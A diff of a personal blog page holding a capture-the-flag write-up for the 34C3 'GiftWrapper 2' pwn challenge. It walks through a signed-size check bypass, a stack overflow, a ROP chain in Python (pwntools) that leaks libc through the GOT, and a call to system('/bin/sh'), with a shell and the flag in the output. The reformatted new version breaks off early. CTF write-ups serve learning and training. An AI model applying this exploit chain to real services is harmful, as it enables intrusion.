@@ -1,625 +1,291 @@
-<!DOCTYPE html>
-<html lang="en">
-<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#">
-    <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-    <meta name="description" content="">
-    <meta property="og:title" content="34C3 CTF: GiftWrapper 2 (pwn)">
-    
-    <meta property="og:type" content="article">
-    <meta property="article:published_time" content="2018-01-21">
-    
-    <meta property="og:description" content="">
-    <meta property="og:url" content="https://segflow.github.io/post/34c3-ctf-giftwrapper2/">
-    <meta property="og:site_name" content="Segflow">
-    
-    <meta property="og:tags" content="writeup">
-    
-    <meta property="og:tags" content="ctf">
-    
-    <meta property="og:tags" content="pwn">
-    
-    <meta property="og:tags" content="rop">
-    
-    <meta name="generator" content="Hugo 0.59.1" />
-
-    
-    <title>34C3 CTF: GiftWrapper 2 (pwn) &middot; Segflow</title>
-    
-
-    
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/default.min.css">
-    
-    <link rel="stylesheet" href="https://segflow.github.io/css/style.css">
-    
-    <link href="https://segflow.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Segflow" />
-    
-    
-    <link rel="icon" href="https://segflow.github.io/favicon.ico" />
-    
-
-    
-    
-</head>
-<body>
-
-<nav class="navbar navbar-default navbar-fixed-top visible-xs">
-	<div class="container-fluid">
-		<div class="navbar-header">
-			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
-				<span class="sr-only">Toggle navigation</span>
-				<span class="icon-bar"></span>
-				<span class="icon-bar"></span>
-				<span class="icon-bar"></span>
-			</button>
-			
-				<a class="navbar-brand" href="https://segflow.github.io/">Segflow</a>
-			
-		</div>
-		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
-			<ul class="nav navbar-nav">
-				
-				
-					<li><a href="https://segflow.github.io//">Home</a></li>
-				
-					<li><a href="https://segflow.github.io/post/">Posts</a></li>
-				
-					<li><a href="https://segflow.github.io/resume.pdf">Resume</a></li>
-				
-			</ul>
-		</div>
-	</div>
-</nav>
-<div class="container-fluid">
-	<div class="row">
-		<div id="menu" class="hidden-xs col-sm-3 col-md-3">
-	<div id="menu-content" class="vertical-align">
-		
-			<h1 class="text-center"><a href="https://segflow.github.io/">Segflow</a></h1>
-		
-		
-		
-			<small class="text-center center-block">Assel Meher</small>
-		
-		
-		
-			<img id="profile-pic" src="https://segflow.github.io//img/hacker_emblem.png" alt="My Picture" class="img-circle center-block">
-		
-		<div id="social" class="text-center">
-			
-				<a href="https://github.com/segflow"><i class="fa fa-github fa-2x"></i></a>
-			
-				<a href="https://www.linkedin.com/in/meher-assel-0122798a"><i class="fa fa-linkedin fa-2x"></i></a>
-			
-				<a href="https://twitter.com/segfl0w"><i class="fa fa-twitter fa-2x"></i></a>
-			
-
-			<a href="mailto:asselmeher@gmail.com"><i class="fa fa-envelope-o fa-2x"></i></a>
-		</div>
-		<div id="links" class="text-center">
-			
-			
-				<a href="https://segflow.github.io//">Home</a>
-			
-				<a href="https://segflow.github.io/post/">Posts</a>
-			
-				<a href="https://segflow.github.io/resume.pdf">Resume</a>
-			
-		</div>
-	</div>
-</div>
-
-		<div id="content" class="col-xs-12 col-sm-9 col-md-9">
-			<div class="row">
-				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10">
-
-<main>
-	<header>
-		<h1>34C3 CTF: GiftWrapper 2 (pwn)</h1>
-	</header>
-
-	<article>
-		<p>In this challenge, we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool. We are also provided with a <code>tar</code> file that contains the service binary and some <code>.so</code> modules.</p>
-
-<p>The task description is the following:</p>
-
-<blockquote>
-<p>Wrapping gifts is now even more fun! Gift Wrapping Factory 2.0:</p>
-
-<p><code>nc 35.198.185.193 1341</code></p>
-
-<p><a href="../../ctf-files/34c3-ctf-2017/giftwrapper2-c653b099aa9bc1b014e5f73008a7e3552387105d.tar.gz">Challenge files</a></p>
-</blockquote>
-
-<p>After extracting the <code>tar</code> file we get this:</p>
-
-<pre><code class="language-shell">$ ls -la
-total 3928
-drwxr-xr-x  9 segflow  staff      288 Jan 21 09:34 .
-drwxr-xr-x  8 segflow  staff      256 Jan  3 13:52 ..
--rwxr-xr-x  1 segflow  staff     8120 Dec 27 21:22 giftwrapper2.so
--rwxr-xr-x  1 segflow  staff  1960656 Oct 11 21:21 libc-2.26.so
--rwxr-xr-x  1 segflow  staff    14456 Dec 27 21:22 server
--rw-r--r--  1 segflow  staff     6024 Dec 27 19:13 server.c
-</code></pre>
-
-<p><code>server</code> is the challenge binary, <code>server.c</code> is its code. <code>libc-2.26.so</code> is the libc library used by the server.</p>
-
-<p>Before understanding the code or the purpose of <code>giftwrapper2.so</code> file, let&rsquo;s try to interact with the service to get an overall understanding of what it&rsquo;s doing. Since the CTF server went down after the competition, we will run the server locally and interact with it.</p>
-
-<pre><code class="language-shell">$ nc localhost 12345
-*
-* Gift Wrapping Factory
-*
-Welcome to the new gift wrapping service!
-Type &quot;help&quot; for help :)
-&gt; help
-wrap                 (Wrap a gift)
-help                 (Show this information)
-modinfo             (Show information about the loaded module)
-&gt; 
-</code></pre>
-
-<p>A menu is shown, and we can print the <code>help</code> message, <code>wrap</code> a gift and print some info using the <code>modinfo</code> command.</p>
-
-<pre><code class="language-shell">&gt; help
-wrap                 (Wrap a gift)
-help                 (Show this information)
-modinfo             (Show information about the loaded module)
-&gt; modinfo
-************************************
-Information about the loaded module:
-Name: Gift Wrapping Factory
-Base address: 0x7f770a712000
-************************************
-&gt; wrap
-What is the size of the gift you want to wrap?
- |&gt; 10
-Please send me your gift.
- |&gt; TEST GIFT
-         _   _
-        ((\o/))
- .-------//^\\------.
- |      /`   `\     |
- |                  |
- | TEST GIFT        |
- |                  |
-  ------------------
-
-Wow! This looks so beautiful
-&gt; 
-</code></pre>
-
-<p>The <code>modinfo</code> command prints some info about the loaded module and its base address. Probably this is about the <code>giftwrapper2.so</code> found in the challenge files.</p>
-
-<p>The <code>wrap</code> command asks about the size of the gift and the gift text after that a nice ascii art is shown containing the gift message.</p>
-
-<p>Since the gift message is printed back to us, I thought it will be a good idea to test if there is a <code>format string</code> vulnerability. Turns out there wasn&rsquo;t.</p>
-
-<pre><code class="language-shell">&gt; wrap
-What is the size of the gift you want to wrap?
- |&gt; 10
-Please send me your gift.
- |&gt; %d
-         _   _
-        ((\o/))
- .-------//^\\------.
- |      /`   `\     |
- |                  |
- | %d               |
- |                  |
-  ------------------
-
-Wow! This looks so beautiful
-&gt; 
-</code></pre>
-
-<p>Now let&rsquo;s see what happen if the gift message is longer then the size we typed.</p>
-
-<pre><code class="language-shell">&gt; wrap
-What is the size of the gift you want to wrap?
- |&gt; 2
-Please send me your gift.
- |&gt; ABCDEFGHIJKLM
-         _   _
-        ((\o/))
- .-------//^\\------.
- |      /`   `\     |
- |                  |
- | ABC              |
- |                  |
-  ------------------
-
-Wow! This looks so beautiful
-&gt; wrap
-What is the size of the gift you want to wrap?
- |&gt; 10000
-Sorry! This gift is too large.
-&gt; 
-</code></pre>
-
-<p>Humm it gets truncated, we are also not allowed to have a very big gift message. So probably the size field is controlled (is it?).</p>
-
-<p>Now that we understand what the server is doing, let&rsquo;s check the source file.</p>
-
-<p>The server code found in <code>server.c</code> is very straightforward,</p>
-
-<ul>
-<li>Setup a socket</li>
-<li>Load the <code>giftwrapper2.so</code> module</li>
-<li>Enter the regular <code>accept -&gt; fork -&gt; drop_priv -&gt; interact</code> loop</li>
-</ul>
-
-<p>The <code>interact</code> function securely reads data from the user, and then calls <code>handle_input</code> which executes the corresponding command based on the user input.</p>
-
-<p>The <code>load_module</code> function is as follow:</p>
-
-<pre><code class="language-cpp">void load_module() {
-    char* error;
-    void* handle = dlopen(LIB, RTLD_LAZY);
-    if (!handle) {
-        logf(&quot;Error on dlopen %s: %s\n&quot;, LIB, dlerror());
-        exit(EXIT_FAILURE);
-    }
-    dlerror();
-    struct link_map* lm = (struct link_map*) handle;
-    module.base = lm-&gt;l_addr;
-
-    initialize_module = dlsym(handle, &quot;initialize_module&quot;);
-    printf(&quot;%p\n&quot;, initialize_module);
-    if ((error = dlerror()) != NULL)  {
-        logf(&quot;%s\n&quot;, error);
-        exit(1);
-    }
-    initialize_module(&amp;module, register_command);
-
-    register_command(&quot;help&quot;, &quot;\t\t\t&quot;, &quot;Show this information&quot;, help);
-    register_command(&quot;modinfo&quot;, &quot;\t\t&quot;, &quot;Show information about the loaded module&quot;, module_info);
-    logf(&quot;Module successfully loaded.\n&quot;);
-}
-</code></pre>
-
-<p>Mainly it loads the <code>giftwrapper2.so</code> module, calls <code>initialize_module</code> within that module and pass the <code>register_command</code> as its second argument. After that, it registers two commands <code>help</code> and <code>modinfo</code>.</p>
-
-<p>So probably the <code>wrap</code> command is registered by the module itself.</p>
-
-<p>Now it&rsquo;s time to reverse engineer the <code>giftwrapper2.so</code> module and hopefully find a flaw there. For this task, I used Binary Ninja, the symbols were not stripped so it&rsquo;s easy to spot the <code>wrap</code> function and disassemble it.</p>
-
-<p><figure>
-    <img src="../../img/34c3-ctf-2017/giftwrapper2-binja-wrap.png" width="100%"/> 
-</figure>
-
-<br/></p>
-
-<p>The logic behind this function is the following:</p>
-
-<ul>
-<li>Read the size from the user and store it into a buffer
-
-<ul>
-<li>If the read fails -&gt; exit</li>
-</ul></li>
-<li>Call <code>strtol</code> to convert the size into a number.
-
-<ul>
-<li>If the size is above 99 -&gt; print an error message and exit the function</li>
-<li>Else, use the <code>read</code> function and pass the size as its argument in order to read up to <code>size</code> bytes.</li>
-</ul></li>
-</ul>
-
-<p>Even though it sounds secure, it&rsquo;s not. The flaw is within this block, can you spot it?</p>
-
-<pre><code class="language-asm">0x855: lea rdi, rsp + 0x65
-0x85a: mov edx, 0
-0x85f: mov esi, 0
-0x864: call strtol         ; convert size to long
-0x869: mov rbp, rax
-0x86c: cmp ax, 0x63        ; compare size with 0x63 (99 in decimal)
-0x870: jg 0x94c            ; jump to 0x94c if greater
-</code></pre>
-
-<p>The conditional jump is done using the <code>jg</code> instruction which is used for <strong>signed</strong> comparison. Check this nice page to better understand <a href="http://unixwiz.net/techtips/x86-jumps.html">x86-jumps</a>. But the <code>read</code> function interprets its argument as an unsigned integer, which means if, when prompted for the size, we type <code>-1</code> (<strong>0xffffffff</strong> in hex) we can bypass the check against <strong>0x63</strong>. This is possible because <strong>0xffffffff &lt; 0x63</strong> when they are interpreted as <em>signed</em> numbers.</p>
-
-<p>Later when we reach the <code>read</code> function, <strong>0xffffffff</strong> is interpreted as an unsigned number so it&rsquo;s possible to read up to <code>4GB</code> of data.</p>
-
-<p>Using this we probably can write over the buffer boundaries and occur an overflow. To verify this hypothesis let&rsquo;s try to crash the binary.</p>
-
-<pre><code class="language-shell">$ nc 0 12345
-*
-* Gift Wrapping Factory
-*
-Welcome to the new gift wrapping service!
-Type &quot;help&quot; for help :)
-&gt; wrap
-What is the size of the gift you want to wrap?
- |&gt; -1
-Please send me your gift.
- |&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-         _   _
-        ((\o/))
- .-------//^\\------.
- |      /`   `\     |
- |                  |
- |                  |
-  ------------------
-
-Wow! This looks so beautiful
-
-$ 
-</code></pre>
-
-<p>Great instead of printing the prompt again, the connection immediately exit after printing the ascii art, this means we probably did overwrite the return address stored in the stack, thus crashing the binary.</p>
-
-<p>Using <code>rabin2</code> from the <a href="http://rada.re/r/">radare2</a> suite, we can get some info from the binary:</p>
-
-<pre><code class="language-shell">$ rabin2 -I server
-arch     x86
-binsz    12597
-bintype  elf
-bits     64
-canary   false
-class    ELF64
-crypto   false
-endian   little
-havecode true
-intrp    /lib64/ld-linux-x86-64.so.2
-lang     c
-linenum  true
-lsyms    true
-machine  AMD x86-64 architecture
-maxopsz  16
-minopsz  1
-nx       true
-os       linux
-pcalign  0
-pic      false
-relocs   true
-relro    partial
-rpath    NONE
-static   false
-stripped false
-subsys   linux
-va       true
-$ 
-</code></pre>
-
-<p>Great no <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack canary</a>, but the stack is not executable (<a href="https://en.wikipedia.org/wiki/NX_bit">NX Bit</a> enabled).</p>
-
-<p>The next step is to know from what offset we start controlling the instruction pointer <strong>rip</strong>, we can do this manually by trying different lengths, but we can also use <code>ragg2</code> to generate a <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">Debruijn sequence</a> and calculate the exact offset after the crash.</p>
-
-<p>The size of wrap&rsquo;s stack frame is <strong>0x70</strong> (112 in decimal), so let&rsquo;s generate a sequence slightly greater than 112</p>
-
-<pre><code class="language-shell">$ ragg2 -r -P 140
-AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuA
-$ 
-</code></pre>
-
-<p>Now we can either attach the server to a debugger, configure it to follow child process, and wait for it to crash so we can get the value of <code>rip</code> register and calculate the offset, or simply use the <code>dmesg</code> command to print info about the last crashes happened in our system. Since I&rsquo;m lazy, I went for the second approach.</p>
-
-<pre><code class="language-shell">$ nc 0 12345
-*
-* Gift Wrapping Factory
-*
-Welcome to the new gift wrapping service!
-Type &quot;help&quot; for help :)
-&gt; -1
-Command not found.
-&gt; wrap
-What is the size of the gift you want to wrap?
- |&gt; -1
-Please send me your gift.
- |&gt; AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2
-         _   _
-        ((\o/))
- .-------//^\\------.
- |      /`   `\     |
- |                  |
- |                  |
-  ------------------
-
-Wow! This looks so beautiful
-
-$ sudo dmesg | tail
-[ 6285.218361] clocksource: Switched to clocksource hpet
-[13404.975546] server[2981]: segfault at 41754141 ip `0000000041754141` sp 00007fff8cbed360 error 14 in libnss_files-2.25.so[7f7709ed4000+b000]
-$ 
-</code></pre>
-
-<p>Great, at the moment of the crash, the instruction pointer was pointing to <strong>0x41754141</strong>. Again using <code>ragg2</code> we can calculate the offset.</p>
-
-<pre><code class="language-shell">$ ragg2 -q 0x41754141
-Little endian: 136
-Big endian: 137
-$ 
-</code></pre>
-
-<p>From <code>rabin2</code> output, we already know that the binary&rsquo;s <a href="https://en.wikipedia.org/wiki/Endianness">endianess</a> is Little Endian, so the offset value is <strong>136</strong>.</p>
-
-<p>At this step we know that we control the instruction pointer, we also know that the stack is not executable. One way to exploit this is to <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return to libc</a>, but since we don&rsquo;t know at what address <code>libc</code> is mapped in the virtual memory, we need to leak some addresses.</p>
-
-<p>Using <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> we can read data from anywhere, this is done because the function <code>puts</code> actually prints bytes from the address pointed by the <code>rdi</code> register. So by chaining
-<code>pop rdi</code> and <code>call puts</code> gadgets we can mount a read-anywhere attack. In order to calculate <code>libc</code> base address, we need to read the address of any symbol from it. Reading any symbol from the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> table allows us to leak addresses from <code>libc</code>, one good candidate is <code>puts</code> entry in <code>GOT</code>, to get its address we can use <code>objdump -R</code>:</p>
-
-<pre><code class="language-shell">$ objdump -R server
-server:     file format elf64-x86-64
-
-DYNAMIC RELOCATION RECORDS
-OFFSET           TYPE              VALUE
-...
-0x00000000602018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
-...
-$ 
-</code></pre>
-
-<p>Now we only need a <code>pop rdi</code> gadget. By using <code>radare2</code> we can get that, below we see that radare2 found two <code>pop rdi</code> gadgets:</p>
-
-<pre><code class="language-shell">$ radare2 server
-[0x00400dc0]&gt; /Rl pop rdi
-0x00401550: pop rdi; ret; 
-0x004015c3: pop rdi; ret;
-[0x00400dc0]&gt; 
-</code></pre>
-
-<p>The following python code connects to the server, interact with it and then send our rop chain. I&rsquo;m using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a> to do this since it makes network programming much more easy and funny.</p>
-
-<pre><code class="language-python">from pwn import *
-
-r = remote('localhost', 12345)
-pop_rdi = 0x00401550
-puts_got = 0x602018
-call_puts = 0x0040122f
-
-rop = p64(pop_rdi)
-rop += p64(puts_got)
-rop += p64(call_puts)
-
-payload = &quot;A&quot; * 136  # fill the buffer
-payload += rop       # Append our rop chain
-
-r.sendlineafter(&quot;&gt; &quot;, &quot;wrap&quot;)  # Send the wrap command
-r.sendlineafter(&quot;|&gt; &quot;, &quot;-1&quot;)  # set the size to -1
-r.sendlineafter(&quot;|&gt; &quot;, payload)  # send the payload
-
-# Get the last sent line, this contains raw data read from *puts_got
-r.recvuntil(&quot;Wow! This looks so beautiful\n&quot;)  # recv the data
-data = r.recvline().strip()
-print(repr(data)) # print raw data so we can verify
-
-# Pad the address to 8 bytes so we can unpack it
-pad = &quot;\x00&quot; * (8 - len(data))
-addr = data + pad
-
-# Unpack the addr
-puts_absolute = u64(addr)
-print &quot;puts is at&quot;, hex(puts_absolute)
-</code></pre>
-
-<pre><code class="language-shell">$ python giftwrapper2_exploit.py
-[..] Opening connection to localhost on port 12345: Trying 127.0.0.1
-New connection from 127.0.0.1 on port 40450
-[+] Opening connection to localhost on port 12345: Done
-127.0.0.1:40450 disconnected
-'`\xc4\x07\xa0\xeb\x7f'
-puts is at 0x7feba007c460
-</code></pre>
-
-<p>Now we know that the absolute address of <code>puts</code> is <strong>0x7feba007c460</strong>, and since we have the libc used by the server we can know puts&rsquo; offset within that libc, we just need to open <code>libc-2.26.so</code> using binary ninja (or radare2 and use the <code>is</code> command) and navigate to <code>puts</code> function:</p>
-
-<p><figure class="text-center">
-    <img src="../../img/34c3-ctf-2017/giftwrapper2-binja-puts.png"/> 
-</figure>
-
-<br/></p>
-
-<p>Here it shows that puts&rsquo; offset within libc is <strong>0x78460</strong>, given this, we can calculate libc base address.</p>
-
-<blockquote>
-<p>libc_base = puts absolute address - puts relative offset</p>
-
-<p>libc_base = <strong>0x7feba007c460</strong> - <strong>0x78460</strong> = <strong>0x7feba0004000</strong></p>
-</blockquote>
-
-<p>By having the libc base address we can get the absolute address of any other symbol within it, so now we just need to call <code>system(&quot;/bin/sh&quot;)</code> and have our flag.</p>
-
-<p>Again using binary ninja we can get the offset of <code>system</code> as well as the string <code>/bin/sh</code>. <br>Argument for <code>system</code> are passed via the <code>rdi</code> register, so just before jumping into it we need to load rdi with the address of <code>/bin/sh</code>.</p>
-
-<p>We already have a <code>pop rdi</code> gadget so this should be easy now. The final exploit is the following:</p>
-
-<script type="application/javascript" src="https://gist.github.com/segflow/65ed5e55ad83ce9b5cf4aec9c0bc3ced.js"></script>
-
-
-<pre><code class="language-shell">&gt; $ python giftwrapper2_exploit.py
-[/.......] Opening connection to localhost on port 12345: Trying 127.0.0.1
-New connection from 127.0.0.1 on port 40450
-[+] Opening connection to localhost on port 12345: Done
-127.0.0.1:40450 disconnected
-'`\xc4\x07\xa0\xeb\x7f'
-puts is at 0x7feba007c460
-libc is at 0x7feba0004000
-system is at 0x7feba0052d60
-/bin/sh is at 0x7feba017a917
-[*] Closed connection to localhost port 12345
-[▁] Opening connection to localhost on port 12345: Trying 127.0.0.1
-New connection from 127.0.0.1 on port 40452
-[+] Opening connection to localhost on port 12345: Done
-[*] Switching to interactive mode
-         _   _
-        ((\o/))
- .-------//^\\------.
- |      /`   `\     |
- |                  |
- |                  |
-  ------------------
-
-Wow! This looks so beautiful
-$ id
-uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
-$ cat flag.txt
-34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts
-$ 
-</code></pre>
-
-<p>Flag: <strong>34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts</strong></p>
-	</article>
-</main>
-
-<div id="bottom-nav" class="text-center center-block">
-	<a href=" https://segflow.github.io/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
-</div>
-
-
-  <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "segflow-io" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-
-
-						</div>
-					</div>
-				</div>
-			</div>
-		</div>
-  </div>
-  
-  <script>
-    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-
-    ga('create', 'UA-111743535-1', 'auto');
-    ga('send', 'pageview');
-    window.baseURL = "https:\/\/segflow.github.io\/";
-  </script>
-  
-  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
-  
-  <script src="//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js"></script>
-  
-  
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
-  
-  <script src="https://segflow.github.io//js/App.js"></script>
-  
-</body>
-</html>
+<!doctype html><html lang=en><head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=description content><meta property="og:title" content="34C3 CTF: GiftWrapper 2 (pwn)"><meta property="og:type" content="article"><meta property="article:published_time" content="2018-01-21"><meta property="og:description" content><meta property="og:url" content="https://segflow.github.io/post/34c3-ctf-giftwrapper2/"><meta property="og:site_name" content="Segflow"><meta property="og:tags" content="writeup"><meta property="og:tags" content="ctf"><meta property="og:tags" content="pwn"><meta property="og:tags" content="rop"><meta name=generator content="Hugo 0.147.2"><title>34C3 CTF: GiftWrapper 2 (pwn) &#183; Segflow</title>
+<link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css><link rel=stylesheet href=//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/default.min.css><link rel=stylesheet href=https://segflow.github.io/css/style.css><link rel=icon href=https://segflow.github.io/favicon.ico></head><body><nav class="navbar navbar-default navbar-fixed-top visible-xs"><div class=container-fluid><div class=navbar-header><button type=button class="navbar-toggle collapsed" data-toggle=collapse data-target=#bs-example-navbar-collapse-1>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=https://segflow.github.io/>Segflow</a></div><div class="collapse navbar-collapse" id=bs-example-navbar-collapse-1><ul class="nav navbar-nav"><li><a href=https://segflow.github.io//>Home</a></li><li><a href=https://segflow.github.io/post/>Posts</a></li><li><a href=https://segflow.github.io/resume.pdf>Resume</a></li></ul></div></div></nav><div class=container-fluid><div class=row><div id=menu class="hidden-xs col-sm-3 col-md-3"><div id=menu-content class=vertical-align><h1 class=text-center><a href=https://segflow.github.io/>Segflow</a></h1><small class="text-center center-block">Assel Meher</small>
+<img id=profile-pic src=https://segflow.github.io//img/hacker_emblem.png alt="My Picture" class="img-circle center-block"><div id=social class=text-center><a href=https://github.com/segflow><i class="fa fa-github fa-2x"></i></a>
+<a href=https://www.linkedin.com/in/meher-assel-0122798a><i class="fa fa-linkedin fa-2x"></i></a>
+<a href=https://twitter.com/segfl0w><i class="fa fa-twitter fa-2x"></i></a>
+<a href=mailto:asselmeher@gmail.com><i class="fa fa-envelope-o fa-2x"></i></a></div><div id=links class=text-center><a href=https://segflow.github.io//>Home</a>
+<a href=https://segflow.github.io/post/>Posts</a>
+<a href=https://segflow.github.io/resume.pdf>Resume</a></div></div></div><div id=content class="col-xs-12 col-sm-9 col-md-9"><div class=row><div id=post class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10"><main><header><h1>34C3 CTF: GiftWrapper 2 (pwn)</h1></header><article><p>In this challenge, we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool. We are also provided with a <code>tar</code> file that contains the service binary and some <code>.so</code> modules.</p><p>The task description is the following:</p><blockquote><p>Wrapping gifts is now even more fun! Gift Wrapping Factory 2.0:</p><p><code>nc 35.198.185.193 1341</code></p><p><a href=../../content-assets/34c3-ctf-giftwrapper2/giftwrapper2-c653b099aa9bc1b014e5f73008a7e3552387105d.tar.gz>Challenge files</a></p></blockquote><p>After extracting the <code>tar</code> file we get this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ ls -la
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>3928</span>
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>9</span> segflow  staff      <span style=color:#ae81ff>288</span> Jan <span style=color:#ae81ff>21</span> 09:34 .
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>8</span> segflow  staff      <span style=color:#ae81ff>256</span> Jan  <span style=color:#ae81ff>3</span> 13:52 ..
+</span></span><span style=display:flex><span>-rwxr-xr-x  <span style=color:#ae81ff>1</span> segflow  staff     <span style=color:#ae81ff>8120</span> Dec <span style=color:#ae81ff>27</span> 21:22 giftwrapper2.so
+</span></span><span style=display:flex><span>-rwxr-xr-x  <span style=color:#ae81ff>1</span> segflow  staff  <span style=color:#ae81ff>1960656</span> Oct <span style=color:#ae81ff>11</span> 21:21 libc-2.26.so
+</span></span><span style=display:flex><span>-rwxr-xr-x  <span style=color:#ae81ff>1</span> segflow  staff    <span style=color:#ae81ff>14456</span> Dec <span style=color:#ae81ff>27</span> 21:22 server
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> segflow  staff     <span style=color:#ae81ff>6024</span> Dec <span style=color:#ae81ff>27</span> 19:13 server.c
+</span></span></code></pre></div><p><code>server</code> is the challenge binary, <code>server.c</code> is its code. <code>libc-2.26.so</code> is the libc library used by the server.</p><p>Before understanding the code or the purpose of the <code>giftwrapper2.so</code> file, let&rsquo;s try to interact with the service to get an overall understanding of what it&rsquo;s doing. Since the CTF server went down after the competition, we will run the server locally and interact with it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nc localhost <span style=color:#ae81ff>12345</span>
+</span></span><span style=display:flex><span>*
+</span></span><span style=display:flex><span>* Gift Wrapping Factory
+</span></span><span style=display:flex><span>*
+</span></span><span style=display:flex><span>Welcome to the new gift wrapping service!
+</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;help&#34;</span> <span style=color:#66d9ef>for</span> help :<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>&gt; help
+</span></span><span style=display:flex><span>wrap                 <span style=color:#f92672>(</span>Wrap a gift<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>help                 <span style=color:#f92672>(</span>Show this information<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>modinfo             <span style=color:#f92672>(</span>Show information about the loaded module<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>&gt; 
+</span></span></code></pre></div><p>A menu is shown, and we can print the <code>help</code> message, <code>wrap</code> a gift and print some info using the <code>modinfo</code> command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>&gt; help
+</span></span><span style=display:flex><span>wrap                 <span style=color:#f92672>(</span>Wrap a gift<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>help                 <span style=color:#f92672>(</span>Show this information<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>modinfo             <span style=color:#f92672>(</span>Show information about the loaded module<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>&gt; modinfo
+</span></span><span style=display:flex><span>************************************
+</span></span><span style=display:flex><span>Information about the loaded module:
+</span></span><span style=display:flex><span>Name: Gift Wrapping Factory
